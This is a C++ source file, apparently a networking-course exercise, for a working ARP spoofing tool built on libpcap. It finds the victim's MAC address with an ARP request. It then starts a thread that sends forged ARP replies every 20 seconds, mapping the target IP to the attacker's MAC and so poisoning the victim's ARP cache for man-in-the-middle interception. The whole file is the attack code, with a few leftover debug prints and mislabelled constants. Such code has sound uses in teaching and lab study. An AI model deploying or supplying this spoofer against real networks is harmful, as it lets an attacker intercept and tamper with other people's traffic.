/*
Program.name 	= ARP_Spoofing
Program.version	= V_1.0.0
Program.devPer	= JYP

----- | S T A R T | -----
1. define
2. 
----- |  E  N  D  | -----
*/

#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <thread>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <net/if.h>

/* 
-------- Define DATA --------
IP&ARP Header SIZE
BROADCAST Mac address
Arp packet struct
-----------------------------
*/
#define IP_HEADER_SIZE 14
#define ARP_HEADER_SIZE 28
u_char BROADCAST_MAC_FF[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, BROADCAST_MAC_00[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

typedef struct myArp{
	uint16_t hType;
	uint16_t pType;
	uint8_t hLength;
	uint8_t pLength;
	uint16_t OPcode;
	uint8_t senderMac[6];
	uint8_t senderIP[4];
	uint8_t targetMac[6];
	uint8_t targetIP[4];
}myArp;

typedef struct myEthernet{
	uint8_t desMac[6];
	uint8_t srcMac[6];
	uint16_t type;
}myEthernet;


/*
-------- Define FUNC --------
1. Arp & Ethernet Pcak Rules
2. Get my Ip & Mac address
3. Thread Reply
-----------------------------
*/
void alertRule(int MLen, char *alert) {
	char* data = ".";
	int dLen = (MLen - strlen(alert) - 4) / 2;
        printf("%d %s\n", strlen(alert), alert);
	for(int i=0; i<3; i++) {
		if(i==1) {
			for(int j=0; j<dLen; j++) { printf("-"); }
			printf("= %s =", alert);
			for(int j=0; j<dLen; j++) { printf("-"); }
			printf("\n");
		}
		else { 
			for(int j=0; j<MLen; j++) { printf("-"); }
			printf("\n");
		}
	}
	return;
}

void arpRulesPacket(struct myArp *arp, u_char *senderMac, char *senderIP, u_char *targetMac, char *targetIP, uint16_t OPcode=0x0002) {
	arp->hType = ntohs(0x0001);
	arp->pType = ntohs(0x0800);
	arp->hLength = 0x06;
	arp->pLength = 0x04;
	arp->OPcode = ntohs(OPcode);
	memcpy(arp->senderMac, senderMac, 6);
	inet_pton(AF_INET, senderIP, &arp->senderIP);
	memcpy(arp->targetMac, targetMac, 6);
	inet_pton(AF_INET, targetIP, &arp->targetIP);
}

void arpRulesEthernet(struct myEthernet *ethernet, u_char *desMac, u_char *srcMac) {
	memcpy(ethernet->desMac, desMac, 6);
	memcpy(ethernet->srcMac, srcMac, 6);
	ethernet->type = ntohs(0x0806);
}

void getMyMac(char *dev, u_char *mac) {
	struct ifreq s;
    	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	s.ifr_addr.sa_family = AF_INET;
    	strncpy(s.ifr_name, dev, IFNAMSIZ-1);

    	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(mac, (u_char*)s.ifr_hwaddr.sa_data, 6);
}

char *getMyIP(char *dev) {
	struct ifreq s;
    	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	char *ip; 

	s.ifr_addr.sa_family = AF_INET;
	strncpy(s.ifr_name, dev, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &s);
	ip = inet_ntoa(((struct sockaddr_in *)&s.ifr_addr)->sin_addr);
	alertRule(51, (char *)"TEST");
	return ip;
}

void whileSendReplyPacket(pcap_t *funcHandle, u_char *funcReplyPacket) {
	while(1) {
		if(pcap_sendpacket(funcHandle, funcReplyPacket, (IP_HEADER_SIZE+ARP_HEADER_SIZE)) != 0) {
                	fprintf(stderr, "Arp Packet Send Error : %s\n", pcap_geterr(funcHandle)); return;
        	}
		printf("-------------------------------------------------\n---------------= Send Arp Packet =---------------\n-------------------------------------------------\n\n");
		alertRule(51, (char *)"TESTT");
		sleep(20);
	}	
}

void usage() { printf("syntax: send_arp <interface> <sender ip> <target ip>\n"); }

/*
-------- Main STRUCT --------
1. Define argv & struct
2. [func] get IP & Mac
3. [func] set Packet Ruels
4. send Request Packet Sender
5. (while) get Sender Mac
6. threat Reply Packet Sender
-----------------------------
*/
int main(int argc, char* argv[]) {
	if (argc != 4) { usage(); return -1; }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) { fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf); return -1; }
	
	struct myArp arp, *rep_arp;
	struct myEthernet ethernet, *rep_ethernet;
	
	u_char *my_Mac = (u_char*)malloc(6), *sender_Mac = (u_char*)malloc(6);
	char *my_IP = getMyIP(dev), *sender_IP = argv[2], *target_IP = argv[3];
	getMyMac(dev, my_Mac);
	
	arpRulesEthernet(&ethernet, BROADCAST_MAC_FF, my_Mac);
	arpRulesPacket(&arp, my_Mac, my_IP, BROADCAST_MAC_00, sender_IP, 0x0001);
	
	u_char *requestPacket;
	requestPacket = (u_char *)malloc(sizeof(char)*(IP_HEADER_SIZE+ARP_HEADER_SIZE));
	memcpy(requestPacket, &ethernet, IP_HEADER_SIZE);
	memcpy(requestPacket+IP_HEADER_SIZE, &arp, ARP_HEADER_SIZE);
	
	if(pcap_sendpacket(handle,requestPacket,42)!= 0) {
		fprintf(stderr,"send error: %s\n",pcap_geterr(handle));
		return -1;
	}

	auto start = std::chrono::system_clock::now();
	while(1) {
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle,&header,&packet);
		if(res == 0) continue;
		if(res == -1 || res == -2 ) break;
		
		rep_ethernet = (struct myEthernet*)packet;

		auto runTime = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now() - start);
               	if(runTime > std::chrono::seconds(3)) {
			printf("-------------------------------------------------\n------------= Arp Request Time Over =------------\n-------------------------------------------------\n"); return 0;
		}		
	
		if(ntohs(rep_ethernet->type) == 0x0806 ) {
			rep_arp = (struct myArp*)(packet+IP_HEADER_SIZE);

			if(memcmp((u_char *)&arp.targetIP, (u_char *)rep_arp->senderIP, 4) == 0) {
				sender_Mac = (u_char *)rep_arp->senderMac;
				break;
			}
		}
	}

	arpRulesEthernet(&ethernet, sender_Mac, my_Mac);
	arpRulesPacket(&arp, my_Mac, target_IP, sender_Mac, sender_IP);

	u_char *replyPacket;
	replyPacket = (u_char *) malloc(sizeof(char)*(IP_HEADER_SIZE+ARP_HEADER_SIZE));
	memcpy(replyPacket, &ethernet, IP_HEADER_SIZE);
	memcpy(replyPacket+IP_HEADER_SIZE, &arp, ARP_HEADER_SIZE);

	std::thread t(&whileSendReplyPacket, handle, replyPacket);

	while(1) {
			
	}

	t.join();;
	pcap_close(handle);
	return 0;
}
